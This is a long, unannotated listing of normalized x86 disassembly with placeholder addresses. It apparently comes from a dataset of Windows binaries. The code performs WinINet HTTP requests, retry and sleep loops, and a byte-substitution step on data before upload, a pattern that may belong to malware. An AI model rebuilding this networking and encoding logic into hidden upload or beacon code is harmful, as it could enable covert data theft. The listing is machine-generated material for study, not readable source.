lea eax [ esp + 0x68 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x68 ]
call sub_409740
lea eax [ esp + 0x9c ]
lea edx [ eax + 0x1 ]
mov bl 0x3b
lea esi [ esp + 0x60 ]
call sub_408a80
xor ebx ebx
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
cmp eax 0x13
je r-xdata
mov esi [ HttpQueryInfoA@IAT ]
lea edx [ esp + 0x50 ]
push edx
lea eax [ esp + 0x4c ]
push eax
lea ecx [ esp + 0x64 ]
push ecx
push 0x20000013
push edi
call esi
cmp eax ebx
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xa0 ]
push ecx
lea eax [ esp + 0x68 ]
call sub_409740
call sub_4083a0
push edi
call [ InternetCloseHandle@IAT ]
cmp [ esp + 0x78 ] 0x10
jb r-xdata
cmp eax 0x14
je r-xdata
mov eax [ esp + 0x5c ]
cmp eax 0xc8
jne r-xdata
mov eax [ rw-data ]
mov esi [ WaitForSingleObject@IAT ]
mov edi [ TerminateThread@IAT ]
mov [ esp + 0x64 ] bl
mov [ esp + 0x74 ] ebx
mov [ esp + 0x78 ] 0xf
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x64 ]
push ecx
cmp eax 0x19
je r-xdata
cmp eax 0x130
jne r-xdata
lea edx [ esp + 0x54 ]
push edx
lea eax [ esp + 0x50 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
push 0x20000005
push edi
mov [ esp + 0x38 ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x60 ] 0x4
call esi
cmp eax ebx
je r-xdata
call sub_407480
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push 0x5dc
push eax
call esi
cmp eax 0x102
jne r-xdata
mov eax [ esp + 0x14 ]
cmp eax 0x2efd
jne r-xdata
cmp eax 0x194
jne r-xdata
lea ecx [ esp + 0x2c ]
push ecx
xor eax eax
lea edx [ esp + 0x14 ]
push edx
push ebx
push 0x17
push edi
mov [ esp + 0x90 ] bl
mov [ esp + 0x91 ] eax
mov [ esp + 0x95 ] eax
mov [ esp + 0x99 ] eax
mov [ esp + 0x9d ] eax
mov [ esp + 0xa1 ] eax
mov [ esp + 0xa5 ] eax
mov [ esp + 0xa9 ] eax
mov [ esp + 0xad ] ax
mov [ esp + 0xaf ] al
mov [ esp + 0x34 ] 0x20
mov [ esp + 0x40 ] ebx
mov [ esp + 0x24 ] ebx
call esi
mov eax [ esp + 0x10 ]
cmp eax [ esp + 0x20 ]
ja r-xdata
push 0x3ffff
lea edx [ esp + 0x2ca1 ]
push ebx
push edx
mov [ esp + 0x44 ] ebx
xor esi esi
mov [ esp + 0x2ca8 ] bl
call sub_414890
add esp 0xc
lea ecx [ ecx ]
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push 0x5dc
push eax
call esi
cmp eax 0x102
jne r-xdata
mov [ rw-data ] ebx
mov edx [ rw-data ]
push 0x1
push edx
call edi
cmp eax 0x2efe
jne r-xdata
mov [ rw-data ] 0x10
jmp r-xdata
mov esi edi
call sub_4049b0
test eax eax
je r-xdata
push edi
call [ InternetCloseHandle@IAT ]
push 0x1388
call [ Sleep@IAT ]
mov [ esp + 0x42cb0 ] bl
cmp [ esp + 0x78 ] 0x10
mov [ rw-data ] 0x3
jb r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push edi
lea ecx [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x48 ]
lea edx [ esp + esi + 0x2ca4 ]
lea eax [ esp + 0x40 ]
call sub_40e110
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push 0x5dc
push eax
call esi
cmp eax 0x102
jne r-xdata
mov [ rw-data ] ebx
mov eax [ rw-data ]
push 0x1
push eax
call edi
cmp eax 0x2f78
jne r-xdata
mov [ rw-data ] 0x12
jmp r-xdata
cmp [ esp + 0x78 ] 0x10
jb r-xdata
mov [ rw-data ] 0x14
push edi
call [ InternetCloseHandle@IAT ]
push 0x1388
call [ Sleep@IAT ]
mov [ esp + 0x42cb0 ] bl
cmp [ esp + 0x78 ] 0x10
mov [ rw-data ] 0x3
jb r-xdata
lea ecx [ esp + 0x49c ]
push 0x800
push ecx
call sub_403e10
add esp 0x8
or eax 0xffffffff
push ebx
lea edx [ esp + 0x4a0 ]
cmp [ rw-data ] ebx
je r-xdata
mov ecx [ esp + 0x64 ]
push ecx
call sub_40f2fb
jmp r-xdata
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x84 ]
push eax
push 0x17
push edi
call esi
add esi [ esp + 0x38 ]
cmp esi [ esp + 0x24 ]
jb r-xdata
mov eax [ esp + 0x1c ]
cmp eax ebx
je r-xdata
push 0x5dc
push eax
call esi
cmp eax 0x102
jne r-xdata
mov [ rw-data ] ebx
mov ecx [ rw-data ]
push 0x1
push ecx
call edi
cmp eax 0x2ee2
jne r-xdata
mov [ rw-data ] 0x16
jmp r-xdata
mov eax [ esp + 0x64 ]
push eax
jmp r-xdata
mov edx [ esp + 0x64 ]
push edx
call sub_40f2fb
jmp r-xdata
add esp 0x4
lea esp [ esp ]
push ebx
push ebx
lea eax [ esp + 0x48 ]
push eax
push edi
mov [ esp + 0x50 ] ebx
call [ InternetQueryDataAvailable@IAT ]
test eax eax
je r-xdata
push 0x3ff
lea edx [ esp + 0xca1 ]
push ebx
push edx
mov [ rw-data ] 0x3
mov [ esp + 0xca8 ] bl
call sub_414890
mov ebx [ esp + 0x1c ]
add esp 0xc
lea eax [ esp + 0xc9c ]
push eax
lea edi [ esp + 0x48 ]
mov [ esp + 0x48 ] 0x400
call sub_40e0b0
push 0xbff
lea ecx [ esp + 0x10a1 ]
push 0x0
push ecx
mov [ esp + 0x10a8 ] 0x0
call sub_414890
mov esi [ esp + 0x30 ]
mov edx [ esp + esi + 0x2ca0 ]
mov eax [ esp + esi + 0x2ca4 ]
lea esi [ esp + esi + 0x2c9c ]
add esp 0xc
push edx
lea ecx [ esp + eax + 0x2ca0 ]
push ecx
lea edx [ esp + 0x10a4 ]
push edx
call sub_4158c0
mov esi [ esi + 0x4 ]
add esp 0xc
lea eax [ esp + 0x109c ]
push esi
push eax
call sub_405450
add esp 0x8
cmp [ rw-data ] 0x13
je r-xdata
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
push eax
call [ InternetCloseHandle@IAT ]
mov [ esp + 0x1c ] ebx
mov [ rw-data ] ebx
mov edx [ rw-data ]
push 0x1
push edx
call edi
cmp eax 0x2ee7
jne r-xdata
mov [ rw-data ] 0x11
jmp r-xdata
call sub_40f2fb
add esp 0x4
push 0xbb8
call [ Sleep@IAT ]
mov edi [ esp + 0x10 ]
xor ebx ebx
jmp r-xdata
push ebx
call [ InternetCloseHandle@IAT ]
lea ecx [ esp + 0x60 ]
mov [ esp + 0x42cb0 ] 0x0
call sub_408370
xor ebx ebx
jmp r-xdata
xor eax eax
mov ecx [ esp + 0x42ca8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x42c90 ]
xor ecx esp
call sub_40e1e0
mov esp ebp
pop ebp
retn 0x4
push eax
call [ InternetCloseHandle@IAT ]
mov [ rw-data ] 0x18
sub_402900
push 0xffffffff
push sub_421078
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1c ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x34 ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov esi [ WaitForSingleObject@IAT ]
xor ebx ebx
push ebx
push eax
call esi
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x34 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x1c ]
xor ecx esp
call sub_40e1e0
add esp 0x2c
retn 0x4
mov ebp [ Sleep@IAT ]
push rw-data
call [ LeaveCriticalSection@IAT ]
xor eax eax
cmp [ esp + 0x28 ] ebx
setne al
cmp eax ebx
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push ebx
push ecx
call esi
test eax eax
je r-xdata
push 0xfa0
call ebp
mov [ esp + 0x3c ] 0xffffffff
cmp [ esp + 0x2c ] 0x10
jb r-xdata
mov eax [ rw-data ]
mov edi eax
cmp eax ebx
jne r-xdata
call sub_40ee1a
mov [ esp + 0x3c ] 0xffffffff
cmp [ esp + 0x2c ] 0x10
jb r-xdata
jmp r-xdata
mov edx [ rw-data ]
push ebx
push edx
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
push eax
jmp r-xdata
mov eax [ eax ]
mov ecx eax
jmp r-xdata
call sub_40ee1a
xor eax eax
xor ecx ecx
mov ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x14 ]
push edx
call sub_404af0
add esp 0x4
test eax eax
jne r-xdata
push ebx
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] bl
call sub_409850
push rw-data
mov [ esp + 0x40 ] ebx
call [ EnterCriticalSection@IAT ]
mov ecx [ rw-data ]
cmp ecx ebx
jbe r-xdata
call sub_40f2fb
add esp 0x4
mov edx [ ecx + 0x1c ]
add edx [ eax + 0x18 ]
cmp esi edx
jb r-xdata
cmp edi ebx
je r-xdata
call sub_40ee1a
push 0xfa0
call ebp
mov eax [ rw-data ]
push ebx
push eax
call esi
test eax eax
jne r-xdata
xor eax eax
mov eax [ edi ]
jmp r-xdata
cmp edi ebx
je r-xdata
cmp edi ebx
je r-xdata
cmp [ eax + 0x14 ] esi
ja r-xdata
xor eax eax
mov eax [ edi ]
jmp r-xdata
xor eax eax
mov eax [ edi ]
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov esi [ edx + ecx * 4 ]
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ eax + 0x10 ]
mov eax [ eax + esi * 4 ]
push ebx
push eax
or eax 0xffffffff
lea esi [ esp + 0x1c ]
call sub_409650
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
sub esi [ eax + 0x14 ]
add ecx eax
mov esi eax
cmp eax ecx
jbe r-xdata
jmp r-xdata
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cmp [ rw-data ] eax
ja r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_40f2fb
add esp 0x4
mov esi [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
sub ecx 0x1
mov [ rw-data ] ecx
jne r-xdata
xor eax eax
mov [ rw-data ] eax
cmp ecx ebx
ja r-xdata
mov [ rw-data ] ebx
sub_402b50
push 0xffffffff
push sub_420f01
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1e70
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1e6c ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1e84 ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
push 0x3ff
xor ebx ebx
lea ecx [ esp + 0x685 ]
push ebx
push ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x68c ] 0x0
call sub_414890
push 0x1ff
lea edx [ esp + 0x91 ]
push ebx
push edx
mov [ esp + 0x98 ] bl
call sub_414890
add esp 0x18
xor eax eax
jmp r-xdata
mov cl [ eax + rw-data ]
mov [ esp + eax + 0x80 ] cl
inc eax
test cl cl
jne r-xdata
push ebx
mov edi 0xf
push r--data
lea ecx [ esp + 0x6c ]
mov [ esp + 0x84 ] edi
mov [ esp + 0x80 ] ebx
mov [ esp + 0x70 ] bl
call sub_409850
push 0xfff
lea eax [ esp + 0xe85 ]
push ebx
mov [ esp + 0x1e94 ] ebx
push eax
mov [ esp + 0xe8c ] 0x0
call sub_414890
mov eax rw-data
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea ecx [ esp + 0xe80 ]
push rw-data
push ecx
mov esi eax
call sub_404890
add esp 0x8
cmp [ esp + 0x78 ] ebx
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x6c ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x6c ]
call sub_409740
lea eax [ esp + 0xe80 ]
lea edx [ eax + 0x1 ]
mov bl 0x3b
lea esi [ esp + 0x64 ]
call sub_408a80
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0xe84 ]
push edx
lea eax [ esp + 0x6c ]
call sub_409740
cmp [ esp + 0x78 ] 0x0
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x6c ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x6c ]
call sub_409740
mov eax rw-data
lea edx [ eax + 0x1 ]
mov bl 0x3b
lea esi [ esp + 0x64 ]
call sub_408a80
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x6c ]
call sub_409740
push 0x0
push r--data
lea ecx [ esp + 0x50 ]
mov [ esp + 0x68 ] edi
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x54 ] 0x0
call sub_409850
mov [ esp + 0x1e8c ] 0x1
cmp [ esp + 0x5c ] 0x0
je r-xdata
push 0x2
push r--data
lea eax [ esp + 0x50 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x50 ]
call sub_409740
mov eax rw-data
lea edx [ eax + 0x1 ]
mov bl 0x3b
lea esi [ esp + 0x48 ]
call sub_408a80
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x50 ]
call sub_409740
cmp [ esp + 0x5c ] 0x0
je r-xdata
push 0x2
push r--data
lea eax [ esp + 0x50 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x50 ]
call sub_409740
mov eax rw-data
lea edx [ eax + 0x1 ]
mov bl 0x3b
lea esi [ esp + 0x48 ]
call sub_408a80
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x50 ]
call sub_409740
mov ecx [ rw-data ]
mov edi r--data
lea edx [ esp + 0x48 ]
call sub_4047f0
mov ecx [ rw-data ]
mov edi r--data
lea edx [ esp + 0x48 ]
call sub_4047f0
cmp [ esp + 0x5c ] 0x0
je r-xdata
push 0x5
push r--data
lea eax [ esp + 0x50 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x50 ]
call sub_409740
push 0x0
push r--data
lea eax [ esp + 0x50 ]
call sub_409740
push 0x408
push 0x0
push rw-data
call sub_414890
mov esi [ esp + 0x68 ]
mov eax 0xaaaaaaab
mul esi
shr edx 0x1
lea eax [ edx + edx * 2 ]
mov ecx esi
sub ecx eax
add esp 0xc
cmp ecx 0x1
jne r-xdata
mov bl 0x3b
lea esi [ esp + 0x48 ]
call sub_408a80
mov eax 0xaaaaaaab
mul esi
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax esi
sub eax edx
cmp eax 0x2
jne r-xdata
push 0x2
push r--data
lea eax [ esp + 0x50 ]
call sub_409740
mov esi [ esp + 0x5c ]
push 0x3ff
lea ecx [ esp + 0x285 ]
push 0x0
push ecx
mov [ esp + 0x28c ] 0x0
call sub_414890
mov eax [ esp + 0x58 ]
mov ebp 0x10
add esp 0xc
cmp [ esp + 0x60 ] ebp
jae r-xdata
push 0x1
push r--data
lea eax [ esp + 0x50 ]
call sub_409740
mov esi [ esp + 0x5c ]
push eax
lea edx [ esp + 0x284 ]
push edx
call sub_404890
add esp 0x8
cmp [ esp + 0x78 ] 0x0
je r-xdata
lea eax [ esp + 0x4c ]
push 0x4
push r--data
lea eax [ esp + 0x6c ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x6c ]
call sub_409740
lea eax [ esp + 0x280 ]
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov bl 0x3b
lea esi [ esp + 0x64 ]
call sub_408a80
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x284 ]
push eax
lea eax [ esp + 0x6c ]
call sub_409740
lea ecx [ esp + 0x680 ]
push 0x400
push ecx
call sub_403e10
add esp 0x8
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x8 ]
push 0x0
push 0x84080000
push 0x0
push 0x0
push r--data
lea edx [ esp + 0x694 ]
push edx
push r--data
or ebx 0xffffffff
push ecx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
call [ HttpOpenRequestA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx [ esp + 0x14 ]
push 0x1
lea eax [ esp + 0x684 ]
mov ecx r--data
call sub_40de90
mov esi eax
jmp r-xdata
xor esi esi
mov edi [ InternetSetOptionA@IAT ]
push 0x4
lea edx [ esp + 0x1c ]
push edx
push 0x41
push esi
mov [ esp + 0x28 ] 0x0
call edi
cmp [ esp + 0x1c ] ebx
je r-xdata
mov ebx r--data
mov edi r--data
call sub_40df80
mov ebx r--data
mov edi r--data
call sub_40df80
mov ebx r--data
mov edi r--data
call sub_40df80
mov ebx r--data
mov edi r--data
call sub_40df80
mov ebx [ esp + 0x68 ]
cmp [ esp + 0x7c ] ebp
jae r-xdata
mov edi r--data
call sub_40df80
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push esi
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
lea ebx [ esp + 0x68 ]
cmp [ esp + 0x20 ] ebx
je r-xdata
push 0x4
lea eax [ esp + 0x20 ]
push eax
push 0x6
push esi
call edi
test eax eax
je r-xdata
mov [ esp + 0x18 ] ebx
mov [ esp + 0x24 ] 0x4
cmp esi ebx
je r-xdata
call [ GetLastError@IAT ]
mov edx [ esp + 0x14 ]
mov [ edx ] eax
jmp r-xdata
push 0x4
lea ecx [ esp + 0x24 ]
push ecx
push 0x5
push esi
call edi
test eax eax
jne r-xdata
cmp [ esp + 0x60 ] ebp
jb r-xdata
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
lea edx [ esp + 0x30 ]
push edx
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
cmp eax ebx
je r-xdata
cmp esi ebx
je r-xdata
mov [ esp + 0x60 ] 0xf
mov [ esp + 0x5c ] ebx
mov [ esp + 0x4c ] bl
cmp [ esp + 0x7c ] ebp
jb r-xdata
mov eax [ esp + 0x4c ]
push eax
call sub_40f2fb
add esp 0x4
mov edi [ esp + 0x28 ]
cmp edi 0xc8
je r-xdata
push esi
call [ InternetCloseHandle@IAT ]
xor eax eax
mov ecx [ esp + 0x1e84 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x1e6c ]
xor ecx esp
call sub_40e1e0
add esp 0x1e7c
retn 0x4
mov ecx [ esp + 0x68 ]
push ecx
call sub_40f2fb
add esp 0x4
mov edx [ esp + 0x14 ]
push edx
lea ecx [ esp + 0x84 ]
mov edi esi
call sub_404da0
add esp 0x4
push 0x3ff
lea eax [ esp + 0xa85 ]
push ebx
push eax
mov [ esp + 0xa8c ] bl
call sub_414890
push edi
lea ecx [ esp + 0xa90 ]
push r--data
push ecx
call sub_40e24c
add esp 0x18
push rw-data
call [ EnterCriticalSection@IAT ]
lea edx [ esp + 0xa80 ]
push edx
lea ecx [ esp + 0x30 ]
call sub_408300
lea eax [ esp + 0x2c ]
push eax
mov [ esp + 0x1e90 ] 0x2
call sub_408f40
cmp [ esp + 0x44 ] ebp
jb r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call sub_40f2fb
add esp 0x4
sub_4031d0
push 0xffffffff
push sub_420ea6
mov eax [ fs : 0x0 ]
push eax
mov eax 0x4e60
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4e5c ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4e74 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x1ff
lea eax [ esp + 0x75 ]
push ebx
push eax
mov [ esp + 0x7c ] bl
call sub_414890
add esp 0xc
xor eax eax
lea ebx [ ebx ]
mov cl [ eax + rw-data ]
mov [ esp + eax + 0x70 ] cl
inc eax
cmp cl bl
jne r-xdata
xor eax eax
mov cl [ eax + rw-data ]
mov [ esp + eax + 0x270 ] cl
inc eax
cmp cl bl
jne r-xdata
mov ecx [ rw-data ]
push ebx
mov [ esp + 0x1c ] ecx
mov esi 0xf
push r--data
lea ecx [ esp + 0x5c ]
mov [ esp + 0x74 ] esi
mov [ esp + 0x70 ] ebx
mov [ esp + 0x60 ] bl
call sub_409850
mov [ esp + 0x4e7c ] ebx
push ebx
push r--data
lea ecx [ esp + 0x40 ]
mov [ esp + 0x58 ] esi
mov [ esp + 0x54 ] ebx
mov [ esp + 0x44 ] bl
call sub_409850
mov [ esp + 0x4e7c ] 0x1
cmp [ esp + 0x4c ] ebx
je r-xdata
push 0x2
push r--data
lea eax [ esp + 0x40 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x40 ]
call sub_409740
mov eax rw-data
lea edx [ eax + 0x1 ]
mov bl 0x3b
lea esi [ esp + 0x38 ]
call sub_408a80
xor ebx ebx
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x40 ]
call sub_409740
cmp [ esp + 0x4c ] ebx
je r-xdata
push 0x2
push r--data
lea eax [ esp + 0x40 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x40 ]
call sub_409740
mov eax rw-data
lea edx [ eax + 0x1 ]
mov bl 0x3b
lea esi [ esp + 0x38 ]
call sub_408a80
xor ebx ebx
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x40 ]
call sub_409740
mov ecx [ rw-data ]
mov edi r--data
lea edx [ esp + 0x38 ]
call sub_4047f0
mov ecx [ rw-data ]
mov edi r--data
lea edx [ esp + 0x38 ]
call sub_4047f0
cmp [ esp + 0x4c ] ebx
je r-xdata
push 0x5
push r--data
lea eax [ esp + 0x40 ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x40 ]
call sub_409740
push ebx
push r--data
lea eax [ esp + 0x40 ]
call sub_409740
push 0x408
push ebx
push rw-data
call sub_414890
mov esi [ esp + 0x58 ]
mov eax 0xaaaaaaab
mul esi
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax esi
sub eax edx
add esp 0xc
cmp eax 0x1
jne r-xdata
mov bl 0x3b
lea esi [ esp + 0x38 ]
call sub_408a80
xor ebx ebx
mov eax 0xaaaaaaab
mul esi
shr edx 0x1
lea ecx [ edx + edx * 2 ]
mov edx esi
sub edx ecx
cmp edx 0x2
jne r-xdata
push 0x2
push r--data
lea eax [ esp + 0x40 ]
call sub_409740
mov esi [ esp + 0x4c ]
push 0x3ff
lea eax [ esp + 0x275 ]
push ebx
push eax
mov [ esp + 0x27c ] bl
call sub_414890
mov eax [ esp + 0x48 ]
add esp 0xc
cmp [ esp + 0x50 ] 0x10
jae r-xdata
push 0x1
push r--data
lea eax [ esp + 0x40 ]
call sub_409740
mov esi [ esp + 0x4c ]
push eax
lea ecx [ esp + 0x274 ]
push ecx
call sub_404890
add esp 0x8
cmp [ esp + 0x68 ] ebx
je r-xdata
lea eax [ esp + 0x3c ]
push 0x4
push r--data
lea eax [ esp + 0x5c ]
call sub_409740
push 0x1
push r--data
lea eax [ esp + 0x5c ]
call sub_409740
lea eax [ esp + 0x270 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov bl 0x3b
lea esi [ esp + 0x54 ]
call sub_408a80
xor ebx ebx
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x274 ]
push edx
lea eax [ esp + 0x5c ]
call sub_409740
mov edx [ rw-data ]
mov [ esp + 0x20 ] edx
cmp [ rw-data ] ebx
je r-xdata
mov eax [ edx + 0x8 ]
push ebx
push 0x84080000
push ebx
push ebx
push r--data
push r--data
push r--data
or edi 0xffffffff
push eax
mov [ esp + 0x48 ] edi
mov [ esp + 0x50 ] edi
call [ HttpOpenRequestA@IAT ]
mov ebp eax
cmp ebp ebx
je r-xdata
push 0x1
mov eax r--data
mov ecx r--data
call sub_40de90
mov ebp eax
jmp r-xdata
xor ebp ebp
mov esi [ InternetSetOptionA@IAT ]
push 0x4
lea ecx [ esp + 0x18 ]
push ecx
push 0x41
push ebp
mov [ esp + 0x24 ] ebx
call esi
cmp [ esp + 0x28 ] edi
je r-xdata
mov ebx r--data
mov edi r--data
mov esi ebp
call sub_40df80
mov ebx r--data
mov edi r--data
call sub_40df80
mov ebx r--data
mov edi r--data
call sub_40df80
mov ebx r--data
mov edi r--data
call sub_40df80
cmp [ esp + 0x6c ] 0x10
mov ebx [ esp + 0x58 ]
jae r-xdata
mov edi r--data
mov esi ebp
call sub_40df80
mov ebx r--data
mov edi r--data
call sub_40df80
lea ecx [ esp + 0x70 ]
push r--data
push ecx
call sub_40eeee
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
lea ebx [ esp + 0x58 ]
cmp [ esp + 0x30 ] edi
je r-xdata
push 0x4
lea edx [ esp + 0x2c ]
push edx
push 0x6
push ebp
call esi
test eax eax
je r-xdata
push 0x2
push 0x0
push esi
call sub_40f7fc
push esi
call sub_40f704
push esi
mov edi eax
call sub_40fc45
add esp 0x14
mov eax edi
or eax 0xffffffff
jmp r-xdata
push 0x4
lea eax [ esp + 0x34 ]
push eax
push 0x5
push ebp
call esi
test eax eax
jne r-xdata
test ebp ebp
je r-xdata
lea edx [ esp + 0x70 ]
push r--data
push edx
call sub_40eeee
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
mov esi [ esp + 0x18 ]
sub eax esi
push eax
mov edx ebp
call sub_40dff0
test eax eax
je r-xdata
mov esi 0x10
cmp [ esp + 0x50 ] esi
jb r-xdata
push ebp
call [ InternetCloseHandle@IAT ]
push 0x0
push esi
push ebx
call sub_40f7fc
push 0x1fff
lea eax [ esp + 0x681 ]
push 0x0
push eax
mov [ esp + 0x688 ] 0x0
call sub_414890
push ebx
mov [ esp + 0x48 ] 0x0
call sub_40e590
add esp 0x1c
test eax eax
jne r-xdata
mov [ esp + 0x50 ] 0xf
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x3c ] 0x0
cmp [ esp + 0x6c ] esi
jb r-xdata
mov eax [ esp + 0x3c ]
push eax
call sub_40f2fb
add esp 0x4
push ebx
call sub_40fc45
add esp 0x4
push 0x0
push 0x0
push 0x0
push ebp
call [ HttpEndRequestA@IAT ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push 0x0
push ecx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x4e74 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4e5c ]
xor ecx esp
call sub_40e1e0
add esp 0x4e6c
retn 0x4
mov ecx [ esp + 0x58 ]
push ecx
call sub_40f2fb
add esp 0x4
mov ebx 0x4
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x14 ] ebx
test ebp ebp
je r-xdata
call [ GetLastError@IAT ]
mov ecx [ esp + 0x20 ]
mov [ ecx ] eax
push ebx
push 0x2000
lea edx [ esp + 0x678 ]
push 0x1
push edx
call sub_40f2aa
push ebx
mov edi eax
call sub_40e5c4
add esp 0x14
test eax eax
jne r-xdata
mov edi [ HttpQueryInfoA@IAT ]
lea edx [ esp + 0x18 ]
push edx
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
push 0x20000013
push ebp
call edi
test eax eax
je r-xdata
push ebx
call sub_40fc45
add esp 0x4
jmp r-xdata
test edi edi
jle r-xdata
cmp [ esp + 0x34 ] 0xc8
jne r-xdata
lea esi [ esp + 0x670 ]
test edi edi
jbe r-xdata
lea ecx [ ecx ]
xor esi esi
push 0x27ff
lea edx [ esp + 0x2675 ]
push esi
push edx
mov [ esp + 0x30 ] esi
mov [ esp + 0x267c ] 0x0
call sub_414890
xor eax eax
add esp 0xc
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
push 0x20000005
push ebp
mov [ esp + 0x30 ] ebx
call edi
test eax eax
je r-xdata
push ebx
call sub_40e590
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x2c ]
push eax
push edi
push esi
push ebp
call [ InternetWriteFile@IAT ]
test eax eax
je r-xdata
movzx ecx [ esp + eax + 0x670 ]
mov dl [ ecx + rw-data ]
mov [ esp + eax + 0x670 ] dl
inc eax
cmp eax edi
jl r-xdata
mov edi [ InternetQueryDataAvailable@IAT ]
mov ebx [ InternetReadFile@IAT ]
nop
mov eax [ esp + 0x2c ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ecx [ esp + 0x20 ]
mov [ ecx ] eax
jmp r-xdata
mov edx [ esp + 0x1c ]
